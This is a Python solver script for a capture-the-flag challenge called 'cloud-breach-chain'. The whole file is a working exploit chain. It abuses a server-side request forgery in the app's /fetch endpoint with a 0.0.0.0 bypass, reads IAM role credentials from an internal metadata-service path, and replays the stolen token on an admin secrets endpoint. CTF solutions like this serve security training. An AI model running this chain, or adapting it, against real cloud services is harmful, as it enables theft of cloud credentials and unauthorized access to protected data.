#!/usr/bin/env python3
"""Automated solver for cloud-breach-chain.

Chains the whole kill path through the public app:

    SSRF (/fetch, 0.0.0.0 bypass) -> internal IMDS creds -> steal the app-role
    Token -> replay it on /api/admin/secrets -> flag.

Usage: solve.py http://HOST:PORT
"""
import html
import json
import re
import sys
import urllib.parse
import urllib.request

META = "http://0.0.0.0:8169/latest/meta-data/iam/security-credentials/kekeli-app-role"


def ssrf(base, url):
    u = base + "/fetch?url=" + urllib.parse.quote(url)
    raw = urllib.request.urlopen(u, timeout=8).read().decode("utf-8", "replace")
    m = re.search(r"<pre>(.*)</pre>", raw, re.S)
    return html.unescape(m.group(1)) if m else raw


def main():
    if len(sys.argv) != 2:
        print("usage: solve.py http://HOST:PORT", file=sys.stderr)
        return 2
    base = sys.argv[1].rstrip("/")

    # Stage 1+2: SSRF to the internal metadata service, read the app-role creds.
    creds = json.loads(ssrf(base, META))
    token = creds["Token"]
    print("[+] stolen app-role Token:", token, file=sys.stderr)

    # Stage 3: replay the stolen Token on the credential-gated admin endpoint.
    req = urllib.request.Request(
        base + "/api/admin/secrets", headers={"X-App-Token": token}
    )
    body = urllib.request.urlopen(req, timeout=8).read().decode("utf-8", "replace")
    flag = json.loads(body).get("flag", "")
    if flag:
        print("[+] flag:", flag)
        return 0
    print("[-] no flag in admin response:", body, file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
